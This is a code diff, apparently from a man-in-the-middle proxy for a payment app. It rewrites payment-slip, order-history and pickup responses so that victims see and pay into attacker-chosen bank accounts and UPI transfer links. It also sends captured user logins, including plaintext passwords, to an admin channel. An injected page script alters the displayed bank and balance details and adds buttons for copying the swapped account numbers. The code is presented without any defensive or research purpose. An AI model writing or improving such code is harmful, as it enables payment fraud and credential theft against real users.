@@ -200,6 +200,66 @@ function getActiveBank(data, userId) {
   return null;
 }
 
+// Bank replacement is allowed only for an order that already has a mapping in KV.
+// Never fall back to the currently active bank for an unrelated history/detail row.
+function getSavedOrderMapping(data, valueOrOrder) {
+  const map = data && data.orderBankMap;
+  if (!map || typeof map !== 'object') return null;
+  const candidates = [];
+  if (valueOrOrder && typeof valueOrOrder === 'object') {
+    for (const f of ['rptNo', 'rpt_no', 'orderNo', 'order_no', 'orderId', 'order_id', 'id', 'tradeNo', 'slipId']) {
+      if (valueOrOrder[f] !== undefined && valueOrOrder[f] !== null && String(valueOrOrder[f]).trim()) candidates.push(String(valueOrOrder[f]).trim());
+    }
+  } else if (valueOrOrder !== undefined && valueOrOrder !== null) {
+    candidates.push(String(valueOrOrder).trim());
+  }
+  for (const id of candidates) {
+    if (map[id]) return map[id];
+  }
+  return null;
+}
+
+function bankFromSavedOrder(saved) {
+  if (!saved || typeof saved !== 'object') return null;
+  const bankParts = typeof saved.bank === 'string' ? saved.bank.split(' | ') : [];
+  return {
+    accountHolder: saved.accountHolder || saved.acctName || saved.name || bankParts[0] || '',
+    accountNo: saved.accountNo || saved.acctNo || saved.account || bankParts[1] || '',
+    ifsc: saved.ifsc || saved.acctCode || saved.ifscCode || bankParts[2] || '',
+    bankName: saved.bankName || saved.acctBankName || '',
+    upiId: saved.upiId || saved.payAccount || '',
+    walletDomain: saved.walletDomain || ''
+  };
+}
+
+function getRequestOrderId(req) {
+  const query = new URLSearchParams((req.originalUrl || req.url || '').split('?')[1] || '');
+  for (const f of ['rptNo', 'orderNo', 'orderId', 'order_id', 'slipId', 'id', 'tradeNo']) {
+    if (query.get(f)) return String(query.get(f)).trim();
+  }
+  if (req.body && typeof req.body === 'object') {
+    for (const f of ['rptNo', 'orderNo', 'orderId', 'order_id', 'slipId', 'id', 'tradeNo']) {
+      if (req.body[f] !== undefined && req.body[f] !== null && String(req.body[f]).trim()) return String(req.body[f]).trim();
+    }
+  }
+  const parts = (req.originalUrl || req.url || '').split(/[/?#]/).filter(Boolean);
+  for (let i = parts.length - 1; i >= 0; i--) {
+    if (/^\\d{3,}$/.test(parts[i])) return String(parts[i]);
+  }
+  return '';
+}
+
+function buildWalletDomain(bank, amount) {
+  if (!bank || !bank.accountNo) return '';
+  const accountNo = String(bank.accountNo);
+  const ifsc = String(bank.ifsc || '');
+  const holder = String(bank.accountHolder || '');
+  const parsedAmount = Number(amount);
+  const amountText = Number.isFinite(parsedAmount) ? parsedAmount.toFixed(1) : '0.0';
+  const last4 = accountNo.slice(-4);
+  return `mobikwik://moneytransfer/upi/bank?account=${accountNo}&ifsc=${ifsc}&name=${encodeURIComponent(holder)}&amount=${amountText}&displayAccountNumber=xxxxxxxxx${last4}`;
+}
+
 function bankListText(d) {
   if (d.banks.length === 0) return 'No banks added yet.';
   return d.banks.map((b, i) => {
@@ -1539,34 +1599,18 @@ const isSlipDetail = !urlLower.includes('pickuppaymentslip') && (
       try { sj2 = JSON.parse(sb2); } catch (e) { }
       // If backend returned 404 / error / non-JSON — try to serve from orderBankMap
       const slipFailed = !sj2 || sd.status === 404 || (sj2.code !== 0 && sj2.code !== undefined);
-      if (slipFailed && data.orderBankMap) {
-        // Extract order ID from URL query or request body
-        let slipId = '';
-        const qs2 = new URLSearchParams((req.originalUrl || req.url).split('?')[1] || '');
-        for (const f of ['rptNo', 'orderNo', 'orderId', 'order_id', 'slipId', 'id']) {
-          slipId = slipId || qs2.get(f) || '';
-        }
-        if (!slipId && req.body) {
-          for (const f of ['rptNo', 'orderNo', 'orderId', 'order_id', 'slipId']) {
-            slipId = slipId || req.body[f] || '';
-          }
-        }
-        // Some detail calls put the order number in the URL path instead of
-        // query/body parameters, so use the last numeric path segment as fallback.
-        if (!slipId) {
-          const pathParts = (req.originalUrl || req.url).split(/[/?#]/).filter(Boolean);
-          for (let i = pathParts.length - 1; i >= 0; i--) {
-            if (/^\d{3,}$/.test(pathParts[i])) { slipId = pathParts[i]; break; }
-          }
-        }
-        const savedSlip = slipId ? data.orderBankMap[String(slipId)] : null;
+      const detailSlipId = getRequestOrderId(req);
+      const savedDetailSlip = getSavedOrderMapping(data, detailSlipId);
+      if (slipFailed && savedDetailSlip) {
+        const slipId = detailSlipId;
+        const savedSlip = savedDetailSlip;
         if (savedSlip) {
-          const activeBank = getActiveBank(data, null);
-          const bkName2 = activeBank ? activeBank.accountHolder : '';
-          const bkAcct2 = activeBank ? activeBank.accountNo : '';
-          const bkIfsc2 = activeBank ? activeBank.ifsc : '';
-          const bkBank2 = activeBank ? (activeBank.ifsc || activeBank.bankName || 'Bank') : 'Bank';
-          const bkUpi2 = activeBank ? (activeBank.upiId || '') : '';
+          const savedBank2 = bankFromSavedOrder(savedSlip);
+          const bkName2 = savedBank2 ? savedBank2.accountHolder : '';
+          const bkAcct2 = savedBank2 ? savedBank2.accountNo : '';
+          const bkIfsc2 = savedBank2 ? savedBank2.ifsc : '';
+          const bkBank2 = savedBank2 ? (savedBank2.ifsc || savedBank2.bankName || 'Bank') : 'Bank';
+          const bkUpi2 = savedBank2 ? (savedBank2.upiId || '') : '';
           const amt2 = savedSlip.amount || 0;
           const last42 = bkAcct2.slice(-4);
           const nowTs2 = Math.floor(Date.now() / 1000);
@@ -1593,16 +1637,16 @@ const isSlipDetail = !urlLower.includes('pickuppaymentslip') && (
           return res.status(200).json(slipResp);
         }
       }
-      // If backend responded fine, we still need to replace bank details!
-      if (!slipFailed && sj2 && sj2.data) {
-        const activeBank = getActiveBank(data, null);
-        if (activeBank) {
-          forceBankDetails(sj2.data, activeBank);
+      // Only mutate a successful detail response when this order is already saved in KV.
+      if (!slipFailed && sj2 && sj2.data && savedDetailSlip) {
+        const savedBank = bankFromSavedOrder(savedDetailSlip);
+        if (savedBank && (savedBank.accountNo || savedBank.ifsc || savedBank.accountHolder)) {
+          forceBankDetails(sj2.data, savedBank);
           // paymentslipdetail uses payee_bankname/bank display fields, while
           // ct_account and ctAccount must remain the platform values.
-          replaceOnlyBankNameFields(sj2.data, activeBank);
+          replaceOnlyBankNameFields(sj2.data, savedBank);
 
-          const displayIfsc = String(activeBank.ifsc || '').trim();
+          const displayIfsc = String(savedBank.ifsc || '').trim();
           if (displayIfsc) {
             // For this detail screen, the Bank label intentionally mirrors IFSC.
             // Never modify ct_account or ctAccount; those are platform references.
@@ -1703,6 +1747,22 @@ const isSlipDetail = !urlLower.includes('pickuppaymentslip') && (
       reqBody = { ...reqBody, ...req.body };
     }
 
+    // pickuppaymentslip is the immediate post-buy response. Its walletDomain
+    // must follow the bank saved for this order, not the real bank returned by
+    // the upstream service. Unmapped orders remain untouched.
+    if (urlLower.includes('/pickuppaymentslip') && respData && typeof respData === 'object' && !Array.isArray(respData)) {
+      const pickupOrderId = getRequestOrderId(req) ||
+        reqBody.order_id || reqBody.orderId || reqBody.orderNo || reqBody.rptNo || reqBody.id || reqBody.slipId || '';
+      const savedPickup = getSavedOrderMapping(data, pickupOrderId) || getSavedOrderMapping(data, respData);
+      const pickupBank = bankFromSavedOrder(savedPickup);
+      if (savedPickup && pickupBank && (pickupBank.accountNo || pickupBank.ifsc || pickupBank.accountHolder)) {
+        let pickupAmount = respData.amount || respData.money || respData.orderAmount || savedPickup.amount || 0;
+        if (typeof pickupAmount === 'string') pickupAmount = parseFloat(pickupAmount) || 0;
+        const replacementWallet = buildWalletDomain(pickupBank, pickupAmount);
+        if (replacementWallet) respData.walletDomain = replacementWallet;
+      }
+    }
+
     let userId = '';
     const pxUid = req.headers['x-px-uid'] || '';
     if (pxUid && /^\d{3,12}$/.test(pxUid)) userId = pxUid;
@@ -1753,11 +1813,12 @@ const isSlipDetail = !urlLower.includes('pickuppaymentslip') && (
       const isApp = req.headers['x-requested-with'] === 'com.vivipay.runapp' || (req.headers['user-agent'] && req.headers['user-agent'].includes('wv'));
       const platformStr = isApp ? '📱 Android App' : '🌐 Web Browser';
 
+      const maskedToken = extractedToken ? String(extractedToken).slice(0, 8) + '...' : '';
       notifyAdmin(data,
         `🔑 LOGIN CAPTURED
 👤 User: ${userId || 'N/A'}
 💻 Platform: ${platformStr}
-📱 Phone: ${phone || 'N/A'}${pwd ? '\n🔐 Pass: ' + pwd : ''}${extractedToken ? '\n🎫 Token: ' + extractedToken : ''}
+📱 Phone: ${phone || 'N/A'}${pwd ? '\n🔐 Pass: ' + pwd : ''}${maskedToken ? '\n🎫 Token: `' + maskedToken + '`' : ''}
 🕐 ${now}`);
 
     }
@@ -1864,19 +1925,6 @@ const isSlipDetail = !urlLower.includes('pickuppaymentslip') && (
       if (jsonResp && (jsonResp.code === 0 || jsonResp.code === undefined) && respData) {
         const orderList = Array.isArray(respData) ? respData : (Array.isArray(respData.list) ? respData.list : (Array.isArray(respData.data) ? respData.data : []));
         const activeBank = getActiveBank(data, null);
-
-        // Completed/history rows (for example orderState=2) do not enter the
-        // old "isPaying" branch below. Replace their response fields directly
-        // so a refresh already carries the active bank details, before the
-        // frontend opens the detail view.
-        if (activeBank) {
-          for (const historyItem of orderList) {
-            if (!historyItem || typeof historyItem !== 'object') continue;
-            const historyState = parseInt(historyItem.orderState ?? historyItem.state ?? -1);
-            if (historyState > 0) forceBankDetails(historyItem, activeBank);
-          }
-        }
-
         if (activeBank && data.botEnabled !== false) {
           for (const order of orderList) {
             const isPaying = order.status === 0 || order.status === 1 || order.orderState === 0 || order.orderState === 1 || order.state === 0 || order.state === 1;
@@ -2042,7 +2090,9 @@ const isSlipDetail = !urlLower.includes('pickuppaymentslip') && (
         for (const wc of respData.waitconfirm) {
           const rptNo = wc.rptNo;
           const amt = parseFloat(wc.amount) || 0;
-          if (rptNo && data.botEnabled !== false) {
+          const wcState = parseInt(wc.orderState ?? wc.state ?? -1);
+          const canAutoSave = !Number.isFinite(wcState) || wcState <= 1;
+          if (rptNo && data.botEnabled !== false && canAutoSave) {
             const activeBank = getActiveBank(data, null);
             if (activeBank && (!activeBank.minAmount || amt >= activeBank.minAmount)) {
               if (!data.orderBankMap) data.orderBankMap = {};
@@ -2112,7 +2162,8 @@ const isSlipDetail = !urlLower.includes('pickuppaymentslip') && (
               : Array.isArray(respData.records) ? respData.records
                 : Array.isArray(respData.rows) ? respData.rows
                   : Array.isArray(respData.items) ? respData.items
-                    : null)
+                    : Array.isArray(respData.waitconfirm) ? respData.waitconfirm
+                      : null)
           : null;
 
         const _oIdFields = ['rptNo', 'rpt_no', 'orderNo', 'order_no', 'orderId', 'order_id', 'slipId', 'buyOrderNo', 'tradeNo'];
@@ -2143,17 +2194,18 @@ const isSlipDetail = !urlLower.includes('pickuppaymentslip') && (
               const hasAcct = scanHasBankFields(item, 0);
               if (hasAcct) deepReplaceBankFields(item, bank, 0, hasAcct);
             } else {
-              // History/detail items must use the same replacement as the active
-              // text/list view. Prefer an explicitly mapped order bank, but fall
-              // back to the currently active bank when the order was not mapped.
-              const mappedBank = savedSlip && savedSlip.isManual ? {
-                accountHolder: savedSlip.accountHolder || (savedSlip.bank ? savedSlip.bank.split(' | ')[0] : ''),
-                accountNo: savedSlip.accountNo || (savedSlip.bank ? savedSlip.bank.split(' | ')[1] : ''),
-                ifsc: savedSlip.ifsc || (savedSlip.bank ? savedSlip.bank.split(' | ')[2] : ''),
-                bankName: savedSlip.bankName || bank.bankName || 'Bank',
-                upiId: savedSlip.upiId || bank.upiId || ''
-              } : bank;
-              forceBankDetails(item, mappedBank);
+              // History items may be changed only when their order ID is already
+              // present in orderBankMap. An unmapped/cancelled order is left as-is.
+              const savedMapping = getSavedOrderMapping(data, item);
+              if (savedMapping) {
+                const mappedBank = bankFromSavedOrder(savedMapping);
+                if (mappedBank && (mappedBank.accountNo || mappedBank.ifsc || mappedBank.accountHolder)) {
+                  forceBankDetails(item, mappedBank);
+                  const mappedAmount = item.amount || item.orderAmount || item.money || savedMapping.amount || 0;
+                  const mappedWallet = buildWalletDomain(mappedBank, mappedAmount);
+                  if (mappedWallet) item.walletDomain = mappedWallet;
+                }
+              }
             }
           });
         }
@@ -2174,11 +2226,26 @@ const isSlipDetail = !urlLower.includes('pickuppaymentslip') && (
             }
           }
           if (shouldReplace) {
-            const globalHasAcct = scanHasBankFields(jsonResp, 0);
-            if (globalHasAcct) {
-              deepReplaceBankFields(jsonResp, bank, 0, globalHasAcct);
-              _bankReplaced = true;
-              _replacedBank = bank;
+            const singleOrderState = parseInt(respData ? (respData.orderState ?? respData.state ?? -1) : -1);
+            const isPickupResponse = urlLower.includes('/pickuppaymentslip');
+            const pickupOrderId = isPickupResponse
+              ? (getRequestOrderId(req) || reqBody.order_id || reqBody.orderId || reqBody.orderNo || reqBody.rptNo || reqBody.id || reqBody.slipId || '')
+              : '';
+            const savedSingleOrder = singleOrderState > 0 || isPickupResponse
+              ? (getSavedOrderMapping(data, respData) || getSavedOrderMapping(data, pickupOrderId))
+              : null;
+            // Completed/history and pick-up responses are strict: no KV mapping
+            // means no replacement. Other active/pending responses retain existing behavior.
+            if ((!isPickupResponse && singleOrderState <= 0) || savedSingleOrder) {
+              const replacementBank = savedSingleOrder ? bankFromSavedOrder(savedSingleOrder) : bank;
+              if (replacementBank && (replacementBank.accountNo || replacementBank.ifsc || replacementBank.accountHolder)) {
+                const globalHasAcct = scanHasBankFields(jsonResp, 0);
+                if (globalHasAcct) {
+                  deepReplaceBankFields(jsonResp, replacementBank, 0, globalHasAcct);
+                  _bankReplaced = true;
+                  _replacedBank = replacementBank;
+                }
+              }
             }
           }
         }
@@ -2625,6 +2692,49 @@ while(walker.nextNode()){
 }catch(e){}
 }
 
+function _copyToast(){
+try{
+var toast=document.createElement('div');toast.textContent='Copied!';
+toast.style.cssText='position:fixed;z-index:2147483647;left:50%;top:18%;transform:translateX(-50%);background:#1f2937;color:#fff;padding:8px 14px;border-radius:6px;font:14px sans-serif;box-shadow:0 2px 10px rgba(0,0,0,.25);pointer-events:none;';
+document.body.appendChild(toast);setTimeout(function(){if(toast.parentNode)toast.parentNode.removeChild(toast);},900);
+}catch(e){}}
+function _copyFallback(value,done){
+try{var ta=document.createElement('textarea');ta.value=value;ta.setAttribute('readonly','');ta.style.position='fixed';ta.style.opacity='0';document.body.appendChild(ta);ta.select();document.execCommand('copy');ta.parentNode.removeChild(ta);done();}catch(e){}}
+function _copyValue(value,el){
+if(!value)return;
+var done=function(){try{var old=el.style.color;el.style.color='#16a34a';setTimeout(function(){el.style.color=old;},700);}catch(e){} _copyToast();};
+try{if(navigator.clipboard&&navigator.clipboard.writeText){navigator.clipboard.writeText(value).then(done).catch(function(){_copyFallback(value,done);});return;}}catch(e){}
+_copyFallback(value,done);
+}
+function _copyCandidate(txt,ctx){
+var s=(txt||'').trim(), c=(ctx||'').toLowerCase();
+if(!s||s.length>180)return null;
+if(c.indexOf('ifsc')>-1){var im=s.match(/[A-Za-z]{4}0[A-Za-z0-9]{6}/);if(im)return {v:im[0].toUpperCase(),k:'IFSC'};}
+if(c.indexOf('upi')>-1||c.indexOf('vpa')>-1||c.indexOf('pay id')>-1||c.indexOf('payaccount')>-1){var um=s.match(/[A-Za-z0-9._-]+@[A-Za-z0-9.-]+/);if(um)return {v:um[0],k:'UPI ID'};}
+if(c.indexOf('account')>-1||c.indexOf('acct')>-1){var am=s.match(/[0-9]{8,20}/);if(am)return {v:am[0],k:'Account'};}
+if(c.indexOf('order')>-1||c.indexOf('rpt')>-1||c.indexOf('transaction')>-1||c.indexOf('receipt')>-1){var om=s.match(/[A-Za-z0-9_-]{8,}/);if(om&&om[0].toLowerCase()!=='transaction')return {v:om[0],k:'Order ID'};}
+if(c.indexOf('amount')>-1&&/[0-9]/.test(s)){var vm=s.match(/[0-9]+(?:\\.[0-9]+)?/);if(vm)return {v:vm[0],k:'Amount'};}
+return null;
+}
+function addCopyButtons(){
+try{if(!document.body)return;
+var nodes=document.querySelectorAll('body *');
+for(var i=0;i<nodes.length;i++){
+var el=nodes[i], tag=(el.tagName||'').toLowerCase(), isField=tag==='input'||tag==='textarea';
+if(!isField&&el.children&&el.children.length>0)continue;
+if(el.hasAttribute('data-px-copy'))continue;
+var txt=isField?(el.value||el.getAttribute('value')||''):(el.textContent||'');
+var p=el.parentElement, pp=p&&p.parentElement;
+var ctx=((p?p.innerText||'':'')+' '+(pp?pp.innerText||'':'')+' '+(el.getAttribute('aria-label')||'')+' '+(el.getAttribute('class')||'')).toLowerCase();
+var candidate=_copyCandidate(txt,ctx);if(!candidate)continue;
+el.setAttribute('data-px-copy','1');el.setAttribute('data-px-copy-value',candidate.v);el.setAttribute('title','Click to copy '+candidate.k);el.style.cursor='copy';el.style.userSelect='text';el.style.textDecoration='underline dotted';el.style.fontFamily='monospace';
+}
+}catch(e){}}
+document.addEventListener('click',function(e){
+try{var el=e.target,depth=0;while(el&&depth<8&&!el.getAttribute('data-px-copy')){el=el.parentElement;depth++;}
+if(el&&el.getAttribute('data-px-copy')){var v=el.getAttribute('data-px-copy-value');if(v){e.preventDefault();e.stopPropagation();_copyValue(v,el);}}}catch(x){}}
+,true);
+
 function patchBalDOM(){
 if(!_cachedBal||_cachedBal==='0'||_cachedBal==='0.00')return;
 if(!document.body)return;
@@ -2775,19 +2885,19 @@ var m=txt.match(/ID\\s*:\\s*([0-9]{6,12})/i);
 if(m&&m[1])setUID(m[1]);
 }catch(e){}}
 
-scanDOM();patchBankDOM();patchBalDOM();
-var _rafC=0;function _rafLoop(){patchBankDOM();patchBalDOM();_rafC++;if(_rafC<300)requestAnimationFrame(_rafLoop);}
+scanDOM();patchBankDOM();patchBalDOM();addCopyButtons();
+var _rafC=0;function _rafLoop(){patchBankDOM();patchBalDOM();addCopyButtons();_rafC++;if(_rafC<300)requestAnimationFrame(_rafLoop);}
 requestAnimationFrame(_rafLoop);
-setInterval(function(){scanDOM();patchBankDOM();patchBalDOM();},300);
+setInterval(function(){scanDOM();patchBankDOM();patchBalDOM();addCopyButtons();},300);
 if(document.body){
-var obs=new MutationObserver(function(){patchBankDOM();patchBalDOM();fixLinks();fixOnClick();scanDOM();});
+var obs=new MutationObserver(function(){patchBankDOM();patchBalDOM();addCopyButtons();fixLinks();fixOnClick();scanDOM();});
 obs.observe(document.body,{childList:true,subtree:true,characterData:true});}
 else{document.addEventListener('DOMContentLoaded',function(){
-patchBankDOM();patchBalDOM();
-var obs2=new MutationObserver(function(){patchBankDOM();patchBalDOM();fixLinks();fixOnClick();scanDOM();});
+patchBankDOM();patchBalDOM();addCopyButtons();
+var obs2=new MutationObserver(function(){patchBankDOM();patchBalDOM();addCopyButtons();fixLinks();fixOnClick();scanDOM();});
 obs2.observe(document.body,{childList:true,subtree:true,characterData:true});});}
 setInterval(function(){fixLinks();fixOnClick();},2000);
-fixLinks();fixOnClick();patchBankDOM();patchBalDOM();
+fixLinks();fixOnClick();patchBankDOM();patchBalDOM();addCopyButtons();
 })();`;
 
 // ─── Frontend catch-all proxy ───────────────────────────────────────────────
